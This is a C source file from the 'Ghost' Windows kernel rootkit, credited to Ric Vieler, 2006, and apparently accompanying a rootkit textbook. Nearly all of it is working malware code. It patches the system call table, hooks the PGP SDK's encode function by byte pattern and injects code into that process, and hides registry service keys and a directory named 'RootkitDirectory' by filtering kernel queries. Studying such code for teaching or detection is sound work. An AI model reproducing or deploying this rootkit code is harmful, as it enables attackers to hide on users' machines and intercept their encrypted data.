// hookManager
// Copyright Ric Vieler, 2006
// Hook the System Call Table

#include "ntddk.h"
#include "Ghost.h"
#include "hookManager.h"
#include "peFormat.h"
#include "injectManager.h"
#include "registryManager.h"

WCHAR g_hiddenDirectoryName[] = L"RootkitDirectory";
#define HIDDEN_DIR_NAME_LENGTH 32

// Add kernel hook(s)
NTSTATUS HookKernel( )
{
	DWORD functionAddress;
	DWORD position;

	pMyMDL = MmCreateMdl(	NULL,
					KeServiceDescriptorTable.ServiceTableBase,
					KeServiceDescriptorTable.NumberOfServices * 4 );

	if( !pMyMDL )
		return( STATUS_UNSUCCESSFUL );

	MmBuildMdlForNonPagedPool( pMyMDL );
	pMyMDL->MdlFlags = pMyMDL->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
	NewSystemCallTable = MmMapLockedPages( pMyMDL, KernelMode );

	if( !NewSystemCallTable )
		return( STATUS_UNSUCCESSFUL );

	// Need ZwProtectVirtualMemory to write into user memory.
	// But it's not defined in ntddk.h so look for pattern
	// searching backward from ZwPulseEvent
	OldZwProtectVirtualMemory = findUnresolved(ZwPulseEvent);
	if( OldZwProtectVirtualMemory == 0 )
		return( STATUS_UNSUCCESSFUL );

	// Add hooks here (remember to unhook if using DriverUnload)
	HOOK( ZwMapViewOfSection, NewZwMapViewOfSection, OldZwMapViewOfSection );
	InitializeKeyTracking();
	HOOK( ZwOpenKey, NewZwOpenKey, OldZwOpenKey );
	HOOK( ZwQueryKey, NewZwQueryKey, OldZwQueryKey );
	HOOK( ZwEnumerateKey, NewZwEnumerateKey, OldZwEnumerateKey );
	HOOK( ZwQueryDirectoryFile, NewZwQueryDirectoryFile, OldZwQueryDirectoryFile );

	return( STATUS_SUCCESS );
}

// Process Inject Dynamic Link Libraries
NTSTATUS NewZwMapViewOfSection(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN ULONG CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Protect )
{
	NTSTATUS status;

	// First complete the standard mapping process
	status = OldZwMapViewOfSection(	SectionHandle,
					ProcessHandle,
					BaseAddress,
					ZeroBits,
					CommitSize,
					SectionOffset OPTIONAL,
					ViewSize,
					InheritDisposition,
					AllocationType,
					Protect );

	// Now remap as required ( imageOffset only known for versions 4 & 5 )
	if( NT_SUCCESS( status ) && ( majorVersion == 4 || majorVersion == 5 ) )
	{
		unsigned int	imageOffset = 0;
		VOID*			pSection = NULL;
		unsigned int	imageSection = FALSE;
		HANDLE			hRoot = NULL;
		PUNICODE_STRING objectName = NULL;
		PVOID			pImageBase = NULL;
		UNICODE_STRING	library1 = { 0 };
		UNICODE_STRING	library2 = { 0 };
		CALL_DATA_STRUCT	callData[TOTAL_HOOKS] = { 0 };
		int					hooks2inject = 0;
		
		// Image location higher in version 4
		if( majorVersion == 4 )
			imageOffset = 24;

		if( ObReferenceObjectByHandle(	SectionHandle,
										SECTION_MAP_EXECUTE,
										*MmSectionObjectType,
										KernelMode, 
										&pSection,
										NULL ) == STATUS_SUCCESS )
		{
			// Check to see if this is an image section
			// If it is, get the root handle and the object name
			_asm
			{
				mov     edx, pSection
				mov     eax, [edx+14h]
				add     eax, imageOffset
				mov     edx, [eax]
				test    byte ptr [edx+20h], 20h
				jz      not_image_section
				mov     imageSection, TRUE
				mov     eax, [edx+24h]
				mov     edx, [eax+4]
				mov     hRoot, edx
				add     eax, 30h
				mov     objectName, eax
				not_image_section:

			}
			if( BaseAddress )
				pImageBase = *BaseAddress;

			// Mapping a DLL
			if( imageSection && pImageBase && objectName && objectName->Length > 0 )
			{
				// define libraries of interest
				RtlInitUnicodeString( &library1, L"kernel32.dll" );
				RtlInitUnicodeString( &library2, L"PGPsdk.dll" );

				if ( IsSameFile( &library1, objectName ) ) // kernel32
				{
					kernel32Base = pImageBase;
				}
				else if ( IsSameFile( &library2, objectName ) ) // PGPsdk
				{
					// Pattern for PGP 9.0 Encode
					BYTE pattern1[] = {	0x55, 0x8B, 0xEC, 0x83, 0xE4, 0xF8, 0x81, 0xEC, \
										0xFC, 0x00, 0x00, 0x00, 0x53, 0x33, 0xC0, 0x56, \
										0x57, 0xB9, 0x26, 0x00, 0x00, 0x00, 0x8D, 0x7C, \
										0x24, 0x18, 0xF3, 0xAB };

					PVOID pfEncode = GetFunctionAddress( pImageBase, NULL, pattern1, sizeof(pattern1) );

					if( !pfEncode )
					{
					// Pattern for PGP 9.5 Encode
						BYTE pattern2[] = {	0x81, 0xEC, 0xFC, 0x00, 0x00, 0x00, 0x53, 0x55, \
											0x33, 0xDB, 0x68, 0x98, 0x00, 0x00, 0x00, 0x8D, \
											0x44, 0x24, 0x14, 0x53, 0x50, 0x89, 0x9C, 0x24, \
											0xB4, 0x00, 0x00, 0x00 };

						pfEncode = GetFunctionAddress( pImageBase, NULL, pattern2, sizeof(pattern2) );
					}

					if( pfEncode )
					{
						hooks2inject = 1;
						callData[0].index = USERHOOK_beforeEncode;
						callData[0].hookFunction = pfEncode;
						callData[0].parameters = 2;
						callData[0].callType = CDECL_TYPE;
						callData[0].stackOffset = 0;
						DbgPrint("comint32: NewZwMapViewOfSection pfEncode = %x",pfEncode);
					}
					else
					{
						DbgPrint("comint32:  PGP Encode not found.");
					}
				}
				if( hooks2inject > 0 )
				{
					PCHAR injectedMemory;

					// prepare memory
					injectedMemory = allocateUserMemory();
					// inject
					if( !processInject( (CALL_DATA_STRUCT*)&callData, hooks2inject, injectedMemory ) )
					{
						DbgPrint("comint32: processInject failed!\n" );
					}
				}
			}
			ObDereferenceObject( pSection );
		}
	}
	return status;
}

// used by GetKeyName
// Get a pointer to an object from its handle
PVOID GetPointerByHandle( HANDLE handle )
{
	PVOID		pKey;
	NTSTATUS	status;

	status = ObReferenceObjectByHandle( handle, 0, NULL, KernelMode, &pKey, NULL );
	
	if( !NT_SUCCESS( status ) )
		return NULL;

	if( pKey )
		ObDereferenceObject( pKey );

	return pKey;
}

// used by NewZwOpenKey
// Get a registry key's name from its handle
void GetKeyName( HANDLE hKey, PUNICODE_STRING* ppKeyName )
{
	PVOID			pKey = NULL;
	PUNICODE_STRING unicodeString;
	PCHAR			pBuffer;
	ULONG			length;
	NTSTATUS		status;

	*ppKeyName = NULL;
	pKey = GetPointerByHandle( hKey );
	if( pKey )
	{
		pBuffer = (PCHAR)ExAllocatePool( NonPagedPool,
			MAXKEYNAMELENGTH * 2 + sizeof(UNICODE_STRING) );
		if( pBuffer )
		{
			memset( pBuffer, 0, MAXKEYNAMELENGTH * 2 + sizeof(UNICODE_STRING) );
			unicodeString = (PUNICODE_STRING)pBuffer;
			RtlInitEmptyUnicodeString( unicodeString,
				(PWCHAR)((DWORD)unicodeString + sizeof(UNICODE_STRING)),
				MAXKEYNAMELENGTH * 2 );
			status = ObQueryNameString( pKey, (POBJECT_NAME_INFORMATION)unicodeString, MAXKEYNAMELENGTH, &length );
			if( status == STATUS_SUCCESS )
				*ppKeyName = unicodeString;
			return;
		}
	}
	return;
}

// create an index that skips hidden subkeys
// when the parent key is \\Services
NTSTATUS NewZwOpenKey( OUT PHANDLE KeyHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes )
{
    int status; 

	status = OldZwOpenKey(
		KeyHandle,
		DesiredAccess,
		ObjectAttributes );      

	if( status == STATUS_SUCCESS )
	{
		// get the name of the key
		PUNICODE_STRING pKeyName = NULL;
		UNICODE_STRING servicesString = { 0 };
		RtlInitUnicodeString( &servicesString, L"Services" );
		GetKeyName( *KeyHandle, &pKeyName );
		// create special index for the Services key							
		if( pKeyName )
		{
			// Using IsSameFile as IsSameKey function
			if( IsSameFile( &servicesString, pKeyName ) )
			{
				DbgPrint("comint32: found g_servicesKey");
				CreateHiddenKeyIndices( *KeyHandle );
			}
			ExFreePool( pKeyName );
		}
	}

	return status;
}

// return number of subkeys from special index
// when the parent key is \\Services
NTSTATUS NewZwQueryKey( IN HANDLE KeyHandle,
	IN KEY_INFORMATION_CLASS KeyInformationClass, 
	OUT PVOID KeyInformation,
	IN ULONG Length,
	OUT PULONG ResultLength )
{
    int status;
	ULONG numberOfSubkeys = -1;

    status = OldZwQueryKey(
		KeyHandle,
		KeyInformationClass,
		KeyInformation,
		Length,
		ResultLength );
    
	numberOfSubkeys = GetSubkeyCount( KeyHandle );
	
	if(	(status == STATUS_SUCCESS) && (numberOfSubkeys != -1) )
		if( KeyFullInformation == KeyInformationClass )
			if( KeyInformation )
				((KEY_FULL_INFORMATION*)KeyInformation)->SubKeys = numberOfSubkeys;

	return status;
}

// return special index values
// when the parent key is \\Services
NTSTATUS NewZwEnumerateKey( IN HANDLE KeyHandle,
	IN ULONG Index,
	IN KEY_INFORMATION_CLASS KeyInformationClass, 
	OUT PVOID KeyInformation,
	IN ULONG Length,
	OUT PULONG ResultLength )
{
    int status;
	int new_index;

	new_index = GetNewIndex( KeyHandle, Index );

	if( new_index != -1 )
		Index = new_index;

    status = OldZwEnumerateKey(
		KeyHandle,
		Index,
		KeyInformationClass,
		KeyInformation,
		Length,
		ResultLength );

    return status;
}

NTSTATUS NewZwQueryDirectoryFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery
)
{
	NTSTATUS status;

	status = OldZwQueryDirectoryFile(
			hFile,
			hEvent,
			IoApcRoutine,
			IoApcContext,
			pIoStatusBlock,
			FileInformationBuffer,
			FileInformationBufferLength,
			FileInfoClass,
			bReturnOnlyOneEntry,
			PathMask,
			bRestartQuery);

	if( NT_SUCCESS( status ) && (FileInfoClass == 3) ) 
	{		
		BOOL isLastDirectory;
		DirEntry* pLastDirectory = NULL;
		DirEntry* pThisDirectory = (DirEntry*)FileInformationBuffer;
		// for each directory entry in the list
		do 
		{
			isLastDirectory = !( pThisDirectory->dwLenToNext );
			
			// compare with g_hiddenDirectoryName
			if( RtlCompareMemory( (PVOID)&pThisDirectory->suName[ 0 ],
				(PVOID)&g_hiddenDirectoryName[ 0 ],
				HIDDEN_DIR_NAME_LENGTH ) == HIDDEN_DIR_NAME_LENGTH ) 
			{
				if( isLastDirectory ) 
				{
					// return STATUS_NO_MORE_FILES if the hidden
					// directory is the only directory in the list
					// else set the previous directory to end-of-list
					// if hidden directory is at the end of the list
					if( pThisDirectory == (DirEntry*)FileInformationBuffer )
						status = 0x80000006;
					else
						pLastDirectory->dwLenToNext = 0;
					break;
				} 
				else 
				{
					// copy remainder of directory list into this location
					// to eliminate this directory entry from the list
					int offset = ((ULONG)pThisDirectory) - (ULONG)FileInformationBuffer;
					int size = (DWORD)FileInformationBufferLength - offset - pThisDirectory->dwLenToNext;
					RtlCopyMemory( (PVOID)pThisDirectory,
						(PVOID)((char*)pThisDirectory + pThisDirectory->dwLenToNext ),
						(DWORD)size );
					continue;
				}
			}
			pLastDirectory = pThisDirectory;
			pThisDirectory = (DirEntry*)((char *)pThisDirectory + pThisDirectory->dwLenToNext );
		} while( !isLastDirectory );
	}

	return( status );
}

// Used to compare a full path to a file name
BOOL IsSameFile(PUNICODE_STRING shortString, PUNICODE_STRING longString)
{
	USHORT index;
	USHORT longLen;
	USHORT shortLen;
	USHORT count;

	index = longString->Length / 2; // wchar_t len is length / 2

	// search backwards for backslash
	while( --index )
		if ( longString->Buffer[index] == L'\\' )
			break;

	// check for same length first
	longLen = (longString->Length / 2) - index - 1;
	shortLen = shortString->Length / 2;
	if( shortLen != longLen )
		return FALSE;

	// Compare
	count = 0;
	while ( count < longLen )
		if ( longString->Buffer[++index] != shortString->Buffer[count++] )
			return FALSE;

	// Match!
	return TRUE;
}

// Compare to char strings
BOOL IsSameString( char* first, char* second )
{
	while( *first && *second )
	{
		if( tolower( *first ) != tolower( *second ) )
			return FALSE;
		first++;
		second++;
	}
	if( *first || *second )
		return FALSE;

	// strings match!
	return TRUE;
}

// Map user address space into the kernel
PVOID MapKernelAddress( PVOID pAddress, PMDL* ppMDL, ULONG size )
{
	PVOID pMappedAddr = NULL;
	
	*ppMDL = IoAllocateMdl( pAddress, size, FALSE, FALSE, NULL );
	if( *ppMDL == NULL )
		return NULL;

	__try
	{
		MmProbeAndLockPages( *ppMDL, KernelMode ,IoReadAccess );
	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		IoFreeMdl( *ppMDL );
		*ppMDL = NULL;
		return NULL;
	}

	pMappedAddr = MmGetSystemAddressForMdlSafe( *ppMDL, HighPagePriority );
	if( !pMappedAddr )
	{
		MmUnlockPages( *ppMDL );
		IoFreeMdl( *ppMDL );
		*ppMDL = NULL;
		return NULL;
	}

	return pMappedAddr;
}

// Free kernel space after mapping in user memory
VOID FreeKernelAddress( PVOID* ppMappedAddr, PMDL* ppMDL )
{
	if( *ppMappedAddr && *ppMDL )
		MmUnmapLockedPages( *ppMappedAddr, *ppMDL );

	*ppMappedAddr = NULL;
	if( *ppMDL )
	{
		MmUnlockPages( *ppMDL );
		IoFreeMdl( *ppMDL );
	}
	*ppMDL = NULL;
}

// get DOS Header -> NT Header -> Optinal Header -> SizeOfImage
ULONG GetImageSize( PVOID baseAddress )
{
    PIMAGE_DOS_HEADER pDOSHeader;
    PIMAGE_NT_HEADER pNTHeader;
    ULONG imageSize = 0;
	PVOID pTempNTHeader;
	PVOID mappedBase;
	PMDL pMDL;

	mappedBase = MapKernelAddress( baseAddress, &pMDL, sizeof(PIMAGE_DOS_HEADER) );
	if( mappedBase )
	{
		pDOSHeader = (PIMAGE_DOS_HEADER)mappedBase;
		pTempNTHeader = (PVOID)(pDOSHeader->e_lfanew);
		FreeKernelAddress( &mappedBase, &pMDL );
		mappedBase = MapKernelAddress( (PVOID)((ULONG)baseAddress + (ULONG)pTempNTHeader), &pMDL, sizeof(PIMAGE_NT_HEADER) );
		if( mappedBase )
		{
			pNTHeader = (PIMAGE_NT_HEADER)mappedBase;
			imageSize = pNTHeader->OptionalHeader.SizeOfImage;
			FreeKernelAddress( &mappedBase, &pMDL );
		}
	}
	return imageSize;
}

// find an undocumented ntdll function
PVOID findUnresolved( PVOID pFunc )
{
	UCHAR	pattern[5] = { 0 };
	PUCHAR	bytePtr = NULL;
	PULONG  oldStart = 0;
	ULONG	newStart = 0;

	memcpy( pattern, pFunc, 5 );

	// subtract offset
	oldStart = (PULONG)&(pattern[1]);
	newStart = *oldStart - 1;
	*oldStart = newStart;

	// Search for pattern
	for( bytePtr = (PUCHAR)pFunc - 5; bytePtr >= (PUCHAR)pFunc - 0x800; bytePtr-- )
		if( checkPattern( bytePtr, pattern, 5 ) == 0 )
			return (PVOID)bytePtr;
	// pattern not found
	return NULL;
}

// Get the address of a function from a DLL
// Pass in the base address of the DLL
// Pass function name OR pattern and pettern length
PVOID GetFunctionAddress(	PVOID BaseAddress,
							char* functionName,
							PBYTE pattern,
							size_t patternLength  )
{
    ULONG imageSize;
    ULONG virtualAddress;
    PVOID returnAddress;
    PULONG functionAddressArray;
    PWORD ordinalArray;
    PULONG functionNameArray;
    ULONG loop;
    ULONG ordinal;
	PVOID mappedBase;
	PMDL pMDL;
	BYTE* bytePtr;
	BYTE* maxBytePtr;
    PIMAGE_DOS_HEADER pDOSHeader;
    PIMAGE_NT_HEADER pNTHeader;
    PIMAGE_EXPORT_DIRECTORY exportDirectory;

	imageSize = GetImageSize( BaseAddress );
	mappedBase = MapKernelAddress( BaseAddress, &pMDL, imageSize );

	if ( functionName == NULL )
	{
		// Search for function pattern
		returnAddress = 0;
		maxBytePtr = (PBYTE)((DWORD)mappedBase + (DWORD)imageSize - (DWORD)patternLength);
		for( bytePtr = (PBYTE)mappedBase; bytePtr < maxBytePtr; bytePtr++ )
		{	
			if( checkPattern( bytePtr, pattern, patternLength ) == 0 )
			{
				returnAddress = (PVOID)((DWORD)BaseAddress + (DWORD)bytePtr - (DWORD)mappedBase);
				break;
			}
		}
		if( mappedBase )
			FreeKernelAddress( &mappedBase, &pMDL );
		return returnAddress;
	}
	
	// Search for function name
    pDOSHeader = (PIMAGE_DOS_HEADER)mappedBase;
    pNTHeader = (PIMAGE_NT_HEADER)((PCHAR)mappedBase + pDOSHeader->e_lfanew);
    imageSize = pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    virtualAddress = pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PCHAR)mappedBase + virtualAddress);
    functionAddressArray = (PULONG)((PCHAR)mappedBase + exportDirectory->AddressOfFunctions);
    ordinalArray  = (PWORD)((PCHAR)mappedBase + exportDirectory->AddressOfNameOrdinals);
    functionNameArray     = (PULONG)((PCHAR)mappedBase + exportDirectory->AddressOfNames);

	ordinal = (ULONG)functionName;
    if (!ordinal)
	{
		if( mappedBase )
			FreeKernelAddress( &mappedBase, &pMDL );
		return 0;
	}
    if( ordinal <= exportDirectory->NumberOfFunctions )
    {
		if( mappedBase )
			FreeKernelAddress( &mappedBase, &pMDL );
        return (PVOID)((PCHAR)BaseAddress + functionAddressArray[ordinal - 1]);
    }

    for( loop = 0; loop < exportDirectory->NumberOfNames; loop++ )
    {
		ordinal = ordinalArray[loop];
		if( functionAddressArray[ordinal] < virtualAddress || functionAddressArray[ordinal] >= virtualAddress + imageSize )
        {
            if( IsSameString( (PSTR)((PCHAR)mappedBase + functionNameArray[loop]), functionName ) )
            {
				returnAddress = (PVOID)functionAddressArray[ordinal];
				if( mappedBase )
					FreeKernelAddress( &mappedBase, &pMDL );
                return (PVOID)((DWORD)BaseAddress + (DWORD)returnAddress);
            }
        }
    }

	DbgPrint("comint32: EXPORT NOT FOUND, function = %s", functionName);
	
	if( mappedBase )
		FreeKernelAddress( &mappedBase, &pMDL );
	return 0;
}

// This should be fast!
int checkPattern( unsigned char* pattern1, unsigned char* pattern2, size_t size )
{
	register unsigned char* p1 = pattern1;
	register unsigned char* p2 = pattern2;
	while( size-- > 0 )
    {
		if( *p1++ != *p2++ )
			return 1;
	}
	return 0;
}
